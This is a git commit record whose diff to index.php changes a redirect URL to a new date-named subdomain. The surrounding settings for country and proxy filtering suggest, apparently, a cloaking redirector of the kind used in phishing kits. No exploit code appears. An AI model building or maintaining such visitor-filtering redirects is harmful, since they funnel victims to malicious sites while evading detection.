7c5542c45d09910f0a1f3428e8328d68cba689ad
youssefphp349 <youssef_benhayoun@hotmail.com>
2025-01-10 16:10:08 +0100

    Update index.php

--- index.php
+++ index.php
@@ -57,7 +57,7 @@ if (isset($_GET["check"]))
 
 $license = "Houss-1987";
 
-$redirect = "https://1-10-2025.netsons.org/";
+$redirect = "https://01-10-2025-updates.netsons.org/";
 
 $parameter = 2; // 1 => Both , 2 => Country , 3 => Proxy , 4 => Simple
 $wordpress = true; // Allow Wordpress Include
